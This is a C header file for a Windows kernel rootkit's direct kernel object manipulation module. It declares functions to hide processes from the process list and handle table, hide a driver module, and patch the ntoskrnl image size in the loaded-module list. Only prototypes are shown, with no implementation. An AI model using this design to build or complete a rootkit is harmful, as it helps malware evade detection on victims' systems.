#ifndef _RK_DKOM_H_
#define _RK_DKOM_H_

#include <ntddk.h>
#include "rootkit.h"

BOOLEAN OnProcessHide(IN ULONG pid);
ULONG FindProcessEPROCByPid( int terminate_PID );
ULONG FindProcessEPROCByName(char procName[]);
BOOLEAN HideProcessFromHandleTable( PEPROCESS eproc);
BOOLEAN HideProcessFromProcessList( PEPROCESS eproc);
BOOLEAN HideModule();
VOID ListProcessByHandleTable();
VOID ListProcessByCRSSTable();
ULONG FindPsLoadedModuleList (IN PDRIVER_OBJECT  DriverObject);
PMODULE_ENTRY FindModuleEntry(PMODULE_ENTRY pPsLoadedModuleList, PUNICODE_STRING usModuleName);
PMODULE_ENTRY PatchNtoskrnlImageSize(PMODULE_ENTRY pPsLoadedModuleList);


#endif
